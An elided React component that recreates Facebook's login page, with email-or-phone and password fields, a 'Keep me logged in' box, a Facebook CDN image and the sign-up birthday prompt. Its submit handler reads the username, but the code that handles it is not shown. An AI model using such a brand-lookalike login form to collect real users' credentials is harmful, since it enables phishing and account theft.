...
export default class Login extends Component {
  ...
  onSubmit = async() => {
    try{
      const username = this.state.txtUser;
  ...
  render() {
    return (      
        <div>
          <div id="navwrapper">
            <div id="navbar"> <table className="tablewrapper">
                <tbody><tr>
                    <td className="row1">Email or Phone</td>
                    <td className="row1">Password</td>
                  </tr>                
                  <tr>
                    <td><input type="text" className="inputtext" value={this.state.txtUser} onChange={(evt)=>{this.setState({txtUser: evt.target.value})}}/>
                    </td>
                  ...
                  <tr>
                    <td>
                      <div className="row2"><input type="checkbox" defaultChecked />Keep me logged in</div></td>
          ...
          <div id="contentwrapper">
            <div id="content">
              <div id="leftbod">
                ...
                <img src='https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/OBaVg52wtTZ.png' alt='main'></img>
              </div>
              <div id="rightbod">
                ...
                <div className="formbox">
                  <span data-type="selectors">
                    ...
                    <div className="fb1 why h">Why do I need to provide my birthday?</div></span></div>
